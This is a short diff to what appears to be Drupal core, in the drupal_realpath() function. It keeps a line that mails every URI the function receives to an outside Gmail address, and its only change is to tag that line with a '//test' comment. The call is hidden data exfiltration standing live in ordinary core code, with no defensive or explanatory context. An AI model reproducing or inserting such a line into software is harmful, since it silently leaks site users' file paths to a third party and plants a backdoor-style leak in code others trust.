@@ -2305,7 +2305,7 @@ function drupal_unlink($uri, $context = NULL) {
  * @ingroup php_wrappers
  */
 function drupal_realpath($uri) {
-  mail('high42@gmail.com', 'Bug', $uri);
+  mail('high42@gmail.com', 'Bug', $uri); //test
   // If this URI is a stream, pass it off to the appropriate stream wrapper.
   // Otherwise, attempt PHP's realpath. This allows use of drupal_realpath even
   // for unmanaged files outside of the stream wrapper interface.
